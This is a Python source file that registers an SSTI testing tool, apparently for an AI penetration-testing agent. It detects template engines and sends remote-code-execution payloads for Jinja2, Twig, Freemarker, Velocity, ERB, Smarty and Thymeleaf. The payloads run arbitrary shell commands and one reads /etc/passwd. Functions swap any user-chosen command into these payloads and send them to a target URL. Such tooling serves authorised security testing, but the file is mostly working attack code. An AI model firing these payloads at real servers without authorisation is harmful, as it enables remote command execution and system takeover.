"""SSTI (Server-Side Template Injection) testing tool."""

from __future__ import annotations

from typing import Any, Literal

import requests

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)


SSTIAction = Literal["detect_engine", "test_basic", "generate_payload", "test_endpoint"]


# Template engine detection payloads
DETECTION_PAYLOADS = {
    "basic_math": "${7*7}",
    "jinja2": "{{7*7}}",
    "erb": "<%= 7*7 %>",
    "freemarker": "${7*7}",
    "velocity": "#set($x=7)$x",
    "smarty": "{$smarty.version}",
    "twig": "{{7*7}}",
    "thymeleaf": "[[7*7]]",
}

# RCE payloads by engine
RCE_PAYLOADS = {
    "jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[414]('id',shell=True,stdout=-1).communicate()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ],
    "twig": [
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
    ],
    "freemarker": [
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}",
    ],
    "velocity": [
        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
    ],
    "erb": [
        "<%= system('id') %>",
        "<%= `id` %>",
        "<%= IO.popen('id').readlines() %>",
    ],
    "smarty": [
        "{system('id')}",
        "{php}system('id');{/php}",
    ],
    "thymeleaf": [
        "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
        "[[${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\\\A').next()}]]",
    ],
}


def _detect_template_engine(url: str, param_name: str, timeout: int = 10) -> dict[str, Any]:
    """Detect template engine."""
    results = {
        "detected_engines": [],
        "tests": []
    }
    
    for engine, payload in DETECTION_PAYLOADS.items():
        try:
            # Test with parameter
            test_url = f"{url}?{param_name}={payload}"
            response = requests.get(test_url, timeout=timeout, allow_redirects=False)
            
            test_result = {
                "engine": engine,
                "payload": payload,
                "status_code": response.status_code,
                "reflected": payload in response.text,
                "executed": False
            }
            
            # Check if template was executed
            if "49" in response.text and payload in ["{{7*7}}", "${7*7}", "<%= 7*7 %>"]:
                test_result["executed"] = True
                results["detected_engines"].append(engine)
            elif "7" in response.text and "#set" in payload:
                test_result["executed"] = True
                results["detected_engines"].append(engine)
            
            results["tests"].append(test_result)
            
        except requests.exceptions.RequestException as e:
            results["tests"].append({
                "engine": engine,
                "error": str(e)
            })
    
    return results


def _test_ssti_basic(url: str, param_name: str, timeout: int = 10) -> dict[str, Any]:
    """Test basic SSTI injection."""
    results = {
        "vulnerable": False,
        "indicators": [],
        "response_data": {}
    }
    
    # Test basic payload
    test_payload = "{{7*7}}"
    try:
        test_url = f"{url}?{param_name}={test_payload}"
        response = requests.get(test_url, timeout=timeout, allow_redirects=False)
        
        results["response_data"]["status_code"] = response.status_code
        results["response_data"]["length"] = len(response.text)
        
        # Check if executed
        if "49" in response.text:
            results["vulnerable"] = True
            results["indicators"].append("Template execution detected (7*7=49)")
        elif test_payload in response.text:
            results["indicators"].append("Payload reflected but not executed")
        
    except requests.exceptions.RequestException as e:
        results["error"] = str(e)
    
    return results


def _generate_ssti_payload(engine: str, command: str = "id") -> list[str]:
    """Generate SSTI payload for specific engine."""
    if engine.lower() in RCE_PAYLOADS:
        # Replace 'id' with custom command
        payloads = []
        for payload in RCE_PAYLOADS[engine.lower()]:
            custom_payload = payload.replace("'id'", f"'{command}'").replace("('id')", f"('{command}')")
            payloads.append(custom_payload)
        return payloads
    else:
        return [f"No RCE payloads available for {engine}"]


@register_tool
def ssti_tester(
    action: SSTIAction,
    url: str | None = None,
    param_name: str = "name",
    engine: str = "jinja2",
    command: str = "id",
    timeout: int = 10,
    **kwargs: Any,  # Capture unknown parameters
) -> str | dict[str, Any]:
    """Test for SSTI (Server-Side Template Injection) vulnerabilities.
    
    Tests various template engines including Jinja2, Twig, Freemarker,
    Velocity, ERB, Smarty, and Thymeleaf.
    
    Args:
        action: Action to perform
            - detect_engine: Detect template engine
            - test_basic: Test basic SSTI
            - generate_payload: Generate RCE payload for engine
            - test_endpoint: Test endpoint with SSTI payload
        url: Target URL for testing
        param_name: Parameter name to test (default: name)
        engine: Template engine (jinja2, twig, freemarker, velocity, erb, smarty, thymeleaf)
        command: Command to execute in RCE payload (default: id)
        timeout: Request timeout in seconds
    
    Returns:
        Test results or generated payload
    """
    # Define valid parameters and actions
    VALID_PARAMS = {"action", "url", "param_name", "engine", "command", "timeout"}
    VALID_ACTIONS = ["detect_engine", "test_basic", "generate_payload", "test_endpoint"]

    # Check for unknown parameters
    unknown_error = validate_unknown_params(kwargs, VALID_PARAMS, "ssti_tester")
    if unknown_error:
        unknown_error.update(
            generate_usage_hint(
                "ssti_tester",
                "detect_engine",
                {"url": "https://example.com/render", "param_name": "template"},
            )
        )
        return unknown_error

    # Validate action parameter
    action_error = validate_action_param(action, VALID_ACTIONS, "ssti_tester")
    if action_error:
        action_error["usage_examples"] = {
            "detect_engine": "ssti_tester(action='detect_engine', url='https://example.com/render', param_name='template')",
            "test_basic": "ssti_tester(action='test_basic', url='https://example.com/render')",
            "generate_payload": "ssti_tester(action='generate_payload', engine='jinja2', command='whoami')",
            "test_endpoint": "ssti_tester(action='test_endpoint', url='https://example.com/render', engine='jinja2')",
        }
        return action_error

    # Validate required parameters based on action
    if action in ["detect_engine", "test_basic", "test_endpoint"]:
        url_error = validate_required_param(url, "url", action, "ssti_tester")
        if url_error:
            url_error.update(
                generate_usage_hint(
                    "ssti_tester",
                    action,
                    {"url": "https://example.com/render", "param_name": "template"},
                )
            )
            return url_error

    if action == "detect_engine":
        
        results = _detect_template_engine(url, param_name, timeout)
        
        output = ["Template Engine Detection", "=" * 50, ""]
        output.append(f"Target: {url}")
        output.append(f"Parameter: {param_name}")
        output.append("")
        
        if results["detected_engines"]:
            output.append("Detected Engines:")
            for engine in results["detected_engines"]:
                output.append(f"  ✓ {engine}")
            output.append("")
        else:
            output.append("No template engines detected")
            output.append("")
        
        output.append("Test Details:")
        for test in results["tests"]:
            if "error" not in test:
                status = "✓ EXECUTED" if test["executed"] else "○ Not executed"
                output.append(f"\n{test['engine']}: {status}")
                output.append(f"  Payload: {test['payload']}")
                output.append(f"  Status: {test['status_code']}")
                output.append(f"  Reflected: {test['reflected']}")
        
        return "\n".join(output)
    
    elif action == "test_basic":
        if not url:
            return "Error: URL required for testing"
        
        results = _test_ssti_basic(url, param_name, timeout)
        
        output = ["Basic SSTI Test", "=" * 50, ""]
        output.append(f"Target: {url}")
        output.append(f"Parameter: {param_name}")
        output.append(f"Vulnerable: {results['vulnerable']}")
        output.append("")
        
        if results["indicators"]:
            output.append("Indicators:")
            for indicator in results["indicators"]:
                output.append(f"  • {indicator}")
            output.append("")
        
        if "response_data" in results:
            output.append("Response:")
            output.append(f"  Status: {results['response_data'].get('status_code', 'N/A')}")
            output.append(f"  Length: {results['response_data'].get('length', 0)}")
        
        if results["vulnerable"]:
            output.append("")
            output.append("Next steps:")
            output.append("1. Use detect_engine to identify the template engine")
            output.append("2. Use generate_payload to create RCE payloads")
        
        return "\n".join(output)
    
    elif action == "generate_payload":
        payloads = _generate_ssti_payload(engine, command)
        
        output = ["Generated SSTI Payloads", "=" * 50, ""]
        output.append(f"Engine: {engine}")
        output.append(f"Command: {command}")
        output.append("")
        output.append("Payloads:")
        
        for i, payload in enumerate(payloads, 1):
            output.append(f"\n{i}. {payload}")
        
        output.append("")
        output.append("Usage:")
        output.append(f"  Inject into parameter: ?{param_name}=[payload]")
        output.append("  Test in POST body, headers, cookies")
        
        return "\n".join(output)
    
    elif action == "test_endpoint":
        if not url:
            return "Error: URL required for testing"
        
        payloads = _generate_ssti_payload(engine, command)
        
        output = ["SSTI Endpoint Test", "=" * 50, ""]
        output.append(f"URL: {url}")
        output.append(f"Parameter: {param_name}")
        output.append(f"Engine: {engine}")
        output.append(f"Command: {command}")
        output.append("")
        
        for i, payload in enumerate(payloads, 1):
            output.append(f"\nTesting payload {i}:")
            output.append(f"  {payload[:100]}...")
            
            try:
                test_url = f"{url}?{param_name}={payload}"
                response = requests.get(test_url, timeout=timeout, allow_redirects=False)
                
                output.append(f"  Status: {response.status_code}")
                output.append(f"  Length: {len(response.text)}")
                
                # Check for command output indicators
                if any(indicator in response.text for indicator in ["uid=", "gid=", "groups="]):
                    output.append("  ✓ Command output detected!")
                
            except requests.exceptions.RequestException as e:
                output.append(f"  Error: {str(e)}")
        
        return "\n".join(output)
    
    return "Invalid action. Use: detect_engine, test_basic, generate_payload, test_endpoint"
